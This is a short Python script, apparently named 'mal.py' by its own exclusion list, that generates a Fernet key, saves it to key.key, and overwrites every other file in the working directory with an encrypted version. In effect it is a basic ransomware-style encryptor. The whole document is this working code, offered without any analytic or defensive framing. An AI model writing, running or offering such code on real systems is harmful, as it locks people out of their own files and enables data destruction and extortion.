import os
from cryptography.fernet import Fernet

# generate a new encryption  key.
key = Fernet.generate_key()

# save the key to a file
with open("key.key", "wb") as key_file:
    key_file.write(key)

# list all files in the directory
path = "."
files = os.listdir(path)

# encrypt the data in each file using the key
fernet = Fernet(key)
for file in files:
    if os.path.isfile(file) and file not in ["dec.py", "key.key", "mal.py"]:
        with open(file, "rb") as original_file:
            original_data = original_file.read()

        encrypted_data = fernet.encrypt(original_data)
        with open(file, "wb") as encrypted_file:
            encrypted_file.write(encrypted_data)
